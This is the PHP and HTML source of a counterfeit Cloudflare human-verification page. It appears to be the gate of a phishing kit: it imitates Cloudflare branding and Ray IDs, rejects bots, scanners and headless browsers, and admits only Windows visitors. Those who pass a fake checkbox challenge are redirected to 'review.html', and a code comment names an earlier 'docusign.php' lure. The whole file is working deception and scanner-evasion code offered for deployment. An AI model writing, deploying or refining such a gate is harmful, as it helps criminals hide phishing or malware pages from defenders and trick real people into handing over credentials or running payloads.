<?php
session_start();

/* ================= CONFIG ================= */
$RATE_LIMIT = 5;
$RATE_WINDOW = 300;
$TOKEN_TTL = 3600;

/* ================= DEVICE DETECTION ================= */
function getDeviceInfo() {
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    
    $os = 'Unknown';
    $browser = 'Unknown';
    $isWindows = false;
    $isMobile = false;
    $isBot = false;
    $osVersion = '';
    
    // Windows Detection
    if (preg_match('/windows nt 10\.0/', $ua)) {
        $os = 'Windows 10/11';
        $isWindows = true;
        $osVersion = '10/11';
    } elseif (preg_match('/windows nt 6\.3/', $ua)) {
        $os = 'Windows 8.1';
        $isWindows = true;
        $osVersion = '8.1';
    } elseif (preg_match('/windows nt 6\.2/', $ua)) {
        $os = 'Windows 8';
        $isWindows = true;
        $osVersion = '8';
    } elseif (preg_match('/windows nt 6\.1/', $ua)) {
        $os = 'Windows 7';
        $isWindows = true;
        $osVersion = '7';
    } elseif (preg_match('/windows/', $ua)) {
        $os = 'Windows';
        $isWindows = true;
        $osVersion = 'Unknown';
    }
    // Block everything else
    elseif (preg_match('/macintosh|mac os x/', $ua)) {
        $os = 'macOS';
        $isWindows = false;
    } elseif (preg_match('/linux/', $ua) && !preg_match('/android/', $ua)) {
        $os = 'Linux';
        $isWindows = false;
    } elseif (preg_match('/android/', $ua)) {
        $os = 'Android';
        $isMobile = true;
        $isWindows = false;
    } elseif (preg_match('/iphone/', $ua)) {
        $os = 'iOS (iPhone)';
        $isMobile = true;
        $isWindows = false;
    } elseif (preg_match('/ipad/', $ua)) {
        $os = 'iOS (iPad)';
        $isMobile = true;
        $isWindows = false;
    } elseif (preg_match('/cros/', $ua)) {
        $os = 'Chrome OS';
        $isWindows = false;
    } else {
        $os = 'Unknown OS';
        $isWindows = false;
    }
    
    // Browser Detection
    if (preg_match('/edg/', $ua)) $browser = 'Edge';
    elseif (preg_match('/chrome/', $ua) && !preg_match('/edg/', $ua)) $browser = 'Chrome';
    elseif (preg_match('/safari/', $ua) && !preg_match('/chrome/', $ua)) $browser = 'Safari';
    elseif (preg_match('/firefox/', $ua)) $browser = 'Firefox';
    elseif (preg_match('/opera|opr/', $ua)) $browser = 'Opera';
    elseif (preg_match('/trident|msie/', $ua)) $browser = 'Internet Explorer';
    
    // Bot Detection
    $botPatterns = ['bot', 'crawl', 'spider', 'scrape', 'headless', 'phantom', 'selenium', 'puppeteer', 'webdriver'];
    foreach ($botPatterns as $pattern) {
        if (strpos($ua, $pattern) !== false) {
            $isBot = true;
            break;
        }
    }
    
    return [
        'os' => $os,
        'browser' => $browser,
        'isWindows' => $isWindows,
        'isMobile' => $isMobile,
        'isBot' => $isBot,
        'osVersion' => $osVersion,
        'ua' => substr($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', 0, 100)
    ];
}

$device = getDeviceInfo();

/* ================= SECURITY ================= */
function ip() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($headers as $h) {
        if (!empty($_SERVER[$h])) {
            $ips = explode(',', $_SERVER[$h]);
            return trim($ips[0]);
        }
    }
    return '0.0.0.0';
}

$ip = ip();

// Block bots immediately
if ($device['isBot']) {
    http_response_code(403);
    exit('Access Denied');
}

$_SESSION['attempts'][$ip] = array_filter(
    $_SESSION['attempts'][$ip] ?? [],
    fn($t) => $t > time() - $RATE_WINDOW
);

if (count($_SESSION['attempts'][$ip] ?? []) >= $RATE_LIMIT) {
    http_response_code(429);
    exit('Rate limited');
}

/* ================= VERIFICATION ================= */
$rayId = substr(strtoupper(bin2hex(random_bytes(16))), 0, 16);
$verified = !empty($_SESSION['cf_verified']) && 
            (time() - $_SESSION['cf_verified'] < $TOKEN_TTL) &&
            !empty($_SESSION['cf_is_windows']) &&
            $_SESSION['cf_is_windows'] === true;

// If already verified and Windows, redirect immediately to review.html
if ($verified && $device['isWindows']) {
    header('Location: review.html');
    exit;
}

// Handle verification request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $_SESSION['attempts'][$ip][] = time();
    
    // Only accept Windows devices
    if (!$device['isWindows']) {
        header('Content-Type: application/json');
        http_response_code(403);
        echo json_encode(['success' => false, 'error' => 'incompatible_device']);
        exit;
    }
    
    $token = $_POST['cf_token'] ?? '';
    $timestamp = (int)($_POST['ts'] ?? 0);
    $mouseData = $_POST['md'] ?? '';
    $screenRes = $_POST['sr'] ?? '';
    $timezone = $_POST['tz'] ?? '';
    
    $timeDiff = time() - $timestamp;
    $hasMouse = strlen($mouseData) > 20;
    $hasScreen = preg_match('/^\d+x\d+$/', $screenRes);
    
    if ($hasMouse && $hasScreen && $timeDiff >= 2 && $timeDiff <= 300 && !empty($timezone)) {
        $_SESSION['cf_verified'] = time();
        $_SESSION['cf_ray'] = $rayId;
        $_SESSION['cf_device'] = $device;
        $_SESSION['cf_is_windows'] = true;
        
        header('Content-Type: application/json');
        // CHANGED: Redirect to review.html instead of docusign.php
        echo json_encode(['success' => true, 'redirect' => 'review.html']);
        exit;
    } else {
        header('Content-Type: application/json');
        http_response_code(400);
        echo json_encode(['success' => false, 'error' => 'challenge_failed']);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Just a moment...</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
    background: #ffffff;
    color: #1c1c1c;
    line-height: 1.5;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
}

/* Header */
.header {
    border-bottom: 1px solid #e5e5e5;
    background: #ffffff;
}

.header-inner {
    max-width: 1200px;
    margin: 0 auto;
    padding: 16px 24px;
    display: flex;
    align-items: center;
    gap: 12px;
}

.logo {
    display: flex;
    align-items: center;
    gap: 12px;
    text-decoration: none;
}

.logo-icon {
    width: 32px;
    height: 32px;
    background: #f48120;
    border-radius: 6px;
    display: flex;
    align-items: center;
    justify-content: center;
}

.logo-icon svg {
    width: 20px;
    height: 20px;
    fill: white;
}

.logo-text {
    font-size: 20px;
    font-weight: 600;
    color: #1c1c1c;
    letter-spacing: -0.5px;
}

/* Main content */
.main {
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 40px 24px;
    background: linear-gradient(to bottom, #ffffff 0%, #fafafa 100%);
}

.container {
    max-width: 480px;
    width: 100%;
}

/* Challenge box */
.challenge-box {
    background: #ffffff;
    border: 1px solid #e5e5e5;
    border-radius: 12px;
    padding: 40px;
    box-shadow: 0 1px 3px rgba(0,0,0,0.04);
}

.challenge-header {
    text-align: center;
    margin-bottom: 32px;
}

.challenge-icon {
    width: 56px;
    height: 56px;
    background: #fff5eb;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 20px;
}

.challenge-icon.error {
    background: #fff2f0;
}

.challenge-icon svg {
    width: 28px;
    height: 28px;
    fill: #f48120;
}

.challenge-icon.error svg {
    fill: #cf1322;
}

h1 {
    font-size: 22px;
    font-weight: 600;
    color: #1c1c1c;
    margin-bottom: 8px;
    letter-spacing: -0.3px;
}

.subtitle {
    color: #666;
    font-size: 15px;
}

/* Error state for non-Windows */
.error-state {
    text-align: center;
    padding: 20px 0;
}

.error-icon {
    width: 64px;
    height: 64px;
    background: #fff2f0;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 20px;
    border: 2px solid #ffccc7;
}

.error-icon svg {
    width: 32px;
    height: 32px;
    fill: #cf1322;
}

.error-title {
    font-size: 20px;
    font-weight: 600;
    color: #cf1322;
    margin-bottom: 12px;
}

.error-message {
    color: #666;
    font-size: 15px;
    line-height: 1.6;
    margin-bottom: 24px;
}

.device-detected {
    background: #f5f5f5;
    border-radius: 8px;
    padding: 16px;
    margin: 20px 0;
    text-align: left;
}

.device-detected-title {
    font-size: 12px;
    font-weight: 600;
    color: #999;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    margin-bottom: 12px;
}

.device-row {
    display: flex;
    justify-content: space-between;
    padding: 8px 0;
    border-bottom: 1px solid #e5e5e5;
    font-size: 14px;
}

.device-row:last-child {
    border-bottom: none;
}

.device-label {
    color: #666;
}

.device-value {
    color: #cf1322;
    font-weight: 500;
}

/* CAPTCHA Widget - Windows only */
.captcha-widget {
    background: #f9f9f9;
    border: 1px solid #e5e5e5;
    border-radius: 8px;
    padding: 20px;
    margin: 24px 0;
}

.widget-box {
    background: #ffffff;
    border: 2px solid #d1d1d1;
    border-radius: 6px;
    padding: 16px 20px;
    display: flex;
    align-items: center;
    gap: 16px;
    cursor: pointer;
    transition: all 0.2s;
    position: relative;
}

.widget-box:hover {
    border-color: #f48120;
    box-shadow: 0 2px 8px rgba(244, 129, 32, 0.08);
}

.widget-box.processing {
    pointer-events: none;
    opacity: 0.7;
}

.widget-box.verified {
    border-color: #00a854;
    background: #f6ffed;
}

.checkbox {
    width: 30px;
    height: 30px;
    border: 2px solid #d1d1d1;
    border-radius: 4px;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    transition: all 0.2s;
    background: #ffffff;
}

.widget-box:hover .checkbox {
    border-color: #f48120;
}

.checkbox.spinner {
    border-color: #f48120;
    border-top-color: transparent;
    animation: spin 0.8s linear infinite;
    border-radius: 50%;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.checkbox.checked {
    background: #00a854;
    border-color: #00a854;
}

.checkbox svg {
    width: 18px;
    height: 18px;
    stroke: white;
    stroke-width: 3;
    fill: none;
    stroke-linecap: round;
    stroke-linejoin: round;
    opacity: 0;
    transform: scale(0.8);
    transition: all 0.2s;
}

.checkbox.checked svg {
    opacity: 1;
    transform: scale(1);
}

.widget-text {
    font-size: 16px;
    color: #1c1c1c;
    font-weight: 500;
    user-select: none;
}

.widget-brand {
    margin-left: auto;
    display: flex;
    align-items: center;
    gap: 8px;
    opacity: 0.6;
}

.widget-brand svg {
    width: 32px;
    height: 32px;
    fill: #f48120;
}

.brand-text {
    font-size: 12px;
    color: #999;
    line-height: 1.2;
    text-align: right;
}

/* Windows info */
.windows-info {
    background: #e6f7ff;
    border: 1px solid #91d5ff;
    border-radius: 6px;
    padding: 12px;
    margin-top: 16px;
    display: flex;
    align-items: center;
    gap: 12px;
    font-size: 13px;
    color: #096dd9;
}

.windows-info svg {
    width: 20px;
    height: 20px;
    fill: #1890ff;
    flex-shrink: 0;
}

/* Details box */
.details-box {
    background: #ffffff;
    border: 1px solid #e5e5e5;
    border-radius: 8px;
    padding: 20px;
    margin-top: 20px;
}

.details-title {
    font-size: 12px;
    font-weight: 600;
    color: #666;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    margin-bottom: 16px;
}

.details-row {
    display: flex;
    justify-content: space-between;
    padding: 8px 0;
    font-size: 14px;
    border-bottom: 1px solid #f0f0f0;
}

.details-row:last-child {
    border-bottom: none;
}

.details-label {
    color: #666;
}

.details-value {
    color: #1c1c1c;
    font-family: 'SF Mono', Monaco, monospace;
    font-size: 13px;
}

/* Error message */
.error-msg {
    display: none;
    background: #fff2f0;
    border: 1px solid #ffccc7;
    color: #cf1322;
    padding: 12px 16px;
    border-radius: 6px;
    margin-bottom: 16px;
    font-size: 14px;
    align-items: center;
    gap: 8px;
}

.error-msg.active {
    display: flex;
}

.error-msg::before {
    content: '⚠';
    font-size: 16px;
}

/* Interstitial */
.interstitial {
    text-align: center;
    display: none;
}

.interstitial.active {
    display: block;
}

.spinner-large {
    width: 48px;
    height: 48px;
    margin: 0 auto 24px;
    border: 4px solid #f3f3f3;
    border-top: 4px solid #f48120;
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

.interstitial h2 {
    font-size: 22px;
    font-weight: 600;
    color: #1c1c1c;
    margin-bottom: 12px;
}

.interstitial p {
    color: #666;
    font-size: 15px;
    margin-bottom: 8px;
}

/* Success state */
.success-state {
    display: none;
    text-align: center;
    padding: 40px;
}

.success-state.active {
    display: block;
}

.success-icon {
    width: 64px;
    height: 64px;
    background: #00a854;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 20px;
    animation: scaleIn 0.3s ease;
}

.success-icon svg {
    width: 32px;
    height: 32px;
    fill: white;
}

@keyframes scaleIn {
    from { transform: scale(0); }
    to { transform: scale(1); }
}

/* Footer */
.footer {
    border-top: 1px solid #e5e5e5;
    background: #fafafa;
    padding: 20px 24px;
}

.footer-inner {
    max-width: 1200px;
    margin: 0 auto;
    display: flex;
    justify-content: space-between;
    align-items: center;
    flex-wrap: wrap;
    gap: 12px;
    font-size: 13px;
    color: #666;
}

.footer-links {
    display: flex;
    gap: 20px;
}

.footer a {
    color: #0056d6;
    text-decoration: none;
}

.footer a:hover {
    text-decoration: underline;
}

.ray-id {
    font-family: 'SF Mono', Monaco, monospace;
    font-size: 12px;
    color: #999;
}

/* Honeypot */
.honeypot {
    position: absolute;
    left: -9999px;
    opacity: 0;
    width: 0;
    height: 0;
}

/* Responsive */
@media (max-width: 600px) {
    .challenge-box {
        padding: 24px;
    }
    
    .footer-inner {
        flex-direction: column;
        text-align: center;
    }
}
</style>
</head>
<body>

<header class="header">
    <div class="header-inner">
        <a href="#" class="logo">
            <div class="logo-icon">
                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
            </div>
            <span class="logo-text">Cloudflare</span>
        </a>
    </div>
</header>

<main class="main">
    <div class="container">
        
        <?php if ($device['isWindows']): ?>
        
        <!-- Windows Challenge -->
        <div class="challenge-box" id="challengeBox">
            <div class="challenge-header">
                <div class="challenge-icon">
                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
                </div>
                <h1>Security Check</h1>
                <p class="subtitle">Please verify you are human to continue</p>
            </div>
            
            <div class="error-msg" id="errorMsg">
                Unable to verify. Please try again.
            </div>
            
            <div class="captcha-widget">
                <div class="widget-box" id="widgetBox">
                    <div class="checkbox" id="checkbox">
                        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
                    </div>
                    <span class="widget-text" id="widgetText">I'm not a robot</span>
                    
                    <div class="widget-brand">
                        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
                        <div class="brand-text">Security<br>by Cloudflare</div>
                    </div>
                    
                    <div class="honeypot">
                        <input type="text" name="email" tabindex="-1" autocomplete="off">
                        <input type="text" name="website" tabindex="-1" autocomplete="off">
                    </div>
                </div>
                
                <div class="windows-info">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                    <span>Windows detected: <?= htmlspecialchars($device['os']) ?> • <?= htmlspecialchars($device['browser']) ?></span>
                </div>
            </div>
            
            <div class="details-box">
                <div class="details-title">Connection Details</div>
                <div class="details-row">
                    <span class="details-label">Ray ID</span>
                    <span class="details-value"><?= $rayId ?></span>
                </div>
                <div class="details-row">
                    <span class="details-label">Data Center</span>
                    <span class="details-value"><?= ['SJC', 'DFW', 'ORD', 'IAD', 'LHR', 'FRA', 'AMS', 'SIN'][array_rand([0,1,2,3,4,5,6,7])] ?></span>
                </div>
                <div class="details-row">
                    <span class="details-label">IP Address</span>
                    <span class="details-value"><?= htmlspecialchars($ip) ?></span>
                </div>
            </div>
        </div>
        
        <!-- Interstitial -->
        <div class="interstitial" id="interstitial">
            <div class="spinner-large"></div>
            <h2>Checking your browser</h2>
            <p>Please wait while we verify your device...</p>
        </div>
        
        <!-- Success -->
        <div class="success-state" id="successState">
            <div class="success-icon">
                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
            </div>
            <h1>Verification successful</h1>
            <p class="subtitle">Redirecting to requested page...</p>
        </div>
        
        <?php else: ?>
        
        <!-- Non-Windows Error -->
        <div class="challenge-box">
            <div class="challenge-header">
                <div class="challenge-icon error">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                </div>
                <h1>Device Not Compatible</h1>
                <p class="subtitle">This resource requires Windows operating system</p>
            </div>
            
            <div class="error-state">
                <div class="error-icon">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                </div>
                <div class="error-title">Access Denied</div>
                <div class="error-message">
                    The application you are trying to access is only available on Windows devices. 
                    Please use a Windows computer to continue.
                </div>
                
                <div class="device-detected">
                    <div class="device-detected-title">Device Detected</div>
                    <div class="device-row">
                        <span class="device-label">Operating System</span>
                        <span class="device-value"><?= htmlspecialchars($device['os']) ?></span>
                    </div>
                    <div class="device-row">
                        <span class="device-label">Browser</span>
                        <span class="device-value"><?= htmlspecialchars($device['browser']) ?></span>
                    </div>
                    <div class="device-row">
                        <span class="device-label">Device Type</span>
                        <span class="device-value"><?= $device['isMobile'] ? 'Mobile/Tablet' : 'Desktop' ?></span>
                    </div>
                </div>
            </div>
            
            <div class="details-box">
                <div class="details-title">Request Details</div>
                <div class="details-row">
                    <span class="details-label">Ray ID</span>
                    <span class="details-value"><?= $rayId ?></span>
                </div>
                <div class="details-row">
                    <span class="details-label">Your IP</span>
                    <span class="details-value"><?= htmlspecialchars($ip) ?></span>
                </div>
                <div class="details-row">
                    <span class="details-label">Timestamp</span>
                    <span class="details-value"><?= date('Y-m-d H:i:s') ?> UTC</span>
                </div>
            </div>
        </div>
        
        <?php endif; ?>
        
    </div>
</main>

<footer class="footer">
    <div class="footer-inner">
        <div class="footer-links">
            <a href="#">Privacy Policy</a>
            <a href="#">Terms of Service</a>
        </div>
        <div class="ray-id">Ray ID: <?= $rayId ?> • Performance & Security by Cloudflare</div>
    </div>
</footer>

<?php if ($device['isWindows']): ?>
<script>
(function() {
    'use strict';
    
    const widgetBox = document.getElementById('widgetBox');
    const checkbox = document.getElementById('checkbox');
    const widgetText = document.getElementById('widgetText');
    const challengeBox = document.getElementById('challengeBox');
    const interstitial = document.getElementById('interstitial');
    const successState = document.getElementById('successState');
    const errorMsg = document.getElementById('errorMsg');
    
    let mousePath = [];
    let startTime = Date.now();
    let hasInteracted = false;
    
    document.addEventListener('mousemove', (e) => {
        hasInteracted = true;
        mousePath.push({x: e.clientX, y: e.clientY, t: Date.now() - startTime});
        if (mousePath.length > 100) mousePath.shift();
    });
    
    document.addEventListener('touchmove', (e) => {
        hasInteracted = true;
        const t = e.touches[0];
        mousePath.push({x: t.clientX, y: t.clientY, t: Date.now() - startTime});
        if (mousePath.length > 100) mousePath.shift();
    }, {passive: true});
    
    widgetBox.addEventListener('click', async function() {
        if (widgetBox.classList.contains('processing')) return;
        
        if (!hasInteracted || mousePath.length < 5) {
            errorMsg.classList.add('active');
            setTimeout(() => errorMsg.classList.remove('active'), 3000);
            return;
        }
        
        if (Date.now() - startTime < 1500) {
            errorMsg.classList.add('active');
            setTimeout(() => errorMsg.classList.remove('active'), 3000);
            return;
        }
        
        widgetBox.classList.add('processing');
        checkbox.classList.add('spinner');
        widgetText.textContent = 'Verifying...';
        
        setTimeout(() => {
            challengeBox.style.display = 'none';
            interstitial.classList.add('active');
        }, 600);
        
        const entropy = btoa(JSON.stringify({
            mouse: mousePath,
            screen: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: Date.now()
        }));
        
        const formData = new FormData();
        formData.append('cf_token', '<?= $rayId ?>');
        formData.append('ts', Math.floor(startTime / 1000));
        formData.append('md', entropy);
        formData.append('sr', screen.width + 'x' + screen.height);
        formData.append('tz', Intl.DateTimeFormat().resolvedOptions().timeZone);
        
        try {
            const response = await fetch('', {
                method: 'POST',
                body: formData,
                headers: {'X-Requested-With': 'XMLHttpRequest'}
            });
            
            if (!response.ok) throw new Error('Failed');
            
            const data = await response.json();
            
            if (data.success) {
                interstitial.classList.remove('active');
                successState.classList.add('active');
                setTimeout(() => {
                    window.location.href = data.redirect || 'review.html';
                }, 1000);
            } else {
                throw new Error('Invalid');
            }
        } catch (e) {
            interstitial.classList.remove('active');
            challengeBox.style.display = 'block';
            widgetBox.classList.remove('processing');
            checkbox.classList.remove('spinner');
            widgetText.textContent = 'I\'m not a robot';
            errorMsg.classList.add('active');
            setTimeout(() => errorMsg.classList.remove('active'), 3000);
        }
    });
})();
</script>
<?php endif; ?>

</body>
</html>